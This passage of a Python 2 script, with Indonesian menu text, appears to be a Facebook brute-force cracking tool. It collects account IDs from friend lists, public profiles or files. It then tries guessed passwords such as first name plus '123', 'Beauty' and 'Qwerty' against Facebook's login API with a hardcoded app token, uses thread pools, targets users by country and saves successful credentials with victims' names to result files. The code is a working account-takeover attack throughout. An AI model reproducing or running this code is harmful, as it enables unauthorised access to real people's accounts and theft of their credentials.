																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/bangla.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone bangla.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
##### CRACK USA #####
def crack_usa():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m)Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;94m _________  \033[1;97m  _____\033[1;94m___.    "
	print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;94m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;91m /    \  \/ \   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;91m \     \____ |  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;94m  \______  / \033[1;97m|__|   \033[1;94m|___  /"
	print "\033[1;94m         \/             \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m──────────────────────\033[1;97m(\033[1;93mUsa\033[1;97m)\033[1;94m───────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_usa()

#### PILIH USA ####
def pilih_usa():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_usa()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;94m _________  \033[1;97m  _____\033[1;94m___.    "
		print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;94m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/ \   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____ |  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;94m  \______  / \033[1;97m|__|   \033[1;94m|___  /"
		print "\033[1;94m         \/             \/ "
		print 50* "\033[1;94m─"
		print ("                \033[1;94m>>> \033[1;93mCRACK USA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;94m _________  \033[1;97m  _____\033[1;94m___.    "
		print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;94m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/ \   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____ |  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;94m  \______  / \033[1;97m|__|   \033[1;94m|___  /"
		print "\033[1;94m         \/             \/ "
		print 50* "\033[1;94m─"
		print ("                \033[1;94m>>> \033[1;93mCRACK USA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mID Publik \033[1;91m:\033[1;97m ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama Akun \033[1;91m:\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik tidak ada !"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_usa()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;94m _________  \033[1;97m  _____\033[1;94m___.    "
		print "\033[1;94m \_   ___ \ \033[1;97m_/ ____\033[1;94m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;91m /    \  \/ \   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;91m \     \____ |  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;94m  \______  / \033[1;97m|__|   \033[1;94m|___  /"
		print "\033[1;94m         \/             \/ "
		try:
			print 50* "\033[1;94m─"
			print ("                \033[1;94m>>> \033[1;93mCRACK USA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali\033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_usa()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_usa()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN USA #####
	def main(arg):
		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
		global cekpoint,oks
		zowe = arg
		try:
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/usa.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/usa.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/usa.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/usa.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/usa.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/usa.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = j['first_name'].lower()+'12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/usa.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/usa.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('Beauty')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/usa.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/usa.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('Beauty')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/usa.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/usa.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('Qwerty')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/usa.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/usa.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'123'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/usa.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/usa.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone usa.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
##### CRACK PAKISTAN  dan india #####
def crack_pakis():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[33;1m _________   ________.    "
	print "\033[33;1m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;97m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;92m  \______  /|__|   |___  /"
	print "\033[1;92m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m────────────────\033[1;97m(\033[1;93mPakistan & India\033[1;97m)\033[1;94m────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_pakis()

#### PILIH PAKISTAN dan india ####
def pilih_pakis():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_pakis()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;93m _________   ________.    "
		print "\033[1;93m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;92m  \______  /|__|   |___  /"
		print "\033[1;92m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("           \033[1;94m>>> \033[1;93mCRACK PAKISTAN & INDIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;93m _________   ________.    "
		print "\033[1;93m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;92m  \______  /|__|   |___  /"
		print "\033[1;92m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("           \033[1;94m>>> \033[1;93mCRACK PAKISTAN & INDIA \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mID Publik \033[1;91m:\033[1;97m ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama Akun \033[1;91m:\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik tidak ada !"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_pakis()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;93m _________   ________.    "
		print "\033[1;93m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;92m  \______  /|__|   |___  /"
		print "\033[1;92m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("           \033[1;94m>>> \033[1;93mCRACK PAKISTAN & INDIA \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali\033[1;92m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_pakis()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_pakis()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
